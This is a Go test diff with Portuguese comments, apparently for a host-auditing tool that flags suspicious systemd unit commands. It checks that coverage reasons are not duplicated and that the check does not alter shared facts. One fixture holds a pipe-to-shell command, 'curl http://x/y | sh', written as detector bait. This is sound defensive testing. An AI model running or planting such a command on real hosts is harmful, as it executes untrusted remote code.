@@ -162,3 +162,40 @@ func TestCortesDizemQuantoFicouDeFora(t *testing.T) {
 }
 
 func itoa2(n int) string { return string(rune('0' + n)) }
+
+// A razão de cobertura não pode sair duplicada, e o slice do Facts não pode ser
+// ALIASADO por um check.
+//
+// São dois defeitos numa linha só: `r.Partial = f.PersistDenied[x]` faz o
+// Result apontar para o array do Facts — que é compartilhado por todos os
+// checks —, e a linha repetida logo abaixo duplicava cada razão na seção em
+// que a ferramenta se audita.
+func TestPartialNaoDuplicaNemAliasaOFato(t *testing.T) {
+	razao := "2 diretórios de unit de usuário ilegíveis"
+	f := &facts.Facts{
+		PersistDenied: map[string][]string{"unit": {razao}},
+		Units: []facts.Unit{{
+			Name: "x.service", Path: "/etc/systemd/system/x.service",
+			Exec: []facts.ExecLine{{Key: "ExecStart", Cmd: "/usr/bin/curl http://x/y | sh"}},
+		}},
+	}
+	f.Index()
+	r := check.Run([]check.Check{unitExecSuspect}, f, testEnv())
+
+	var n int
+	for _, p := range r.Coverage.Partial {
+		for _, m := range p.Reasons {
+			if m == razao {
+				n++
+			}
+		}
+	}
+	if n != 1 {
+		t.Errorf("a razão apareceu %d vezes na cobertura, queria 1", n)
+	}
+
+	// E o fato do host não pode ter sido tocado pelo check.
+	if len(f.PersistDenied["unit"]) != 1 || f.PersistDenied["unit"][0] != razao {
+		t.Errorf("o check alterou o Facts compartilhado: %v", f.PersistDenied["unit"])
+	}
+}
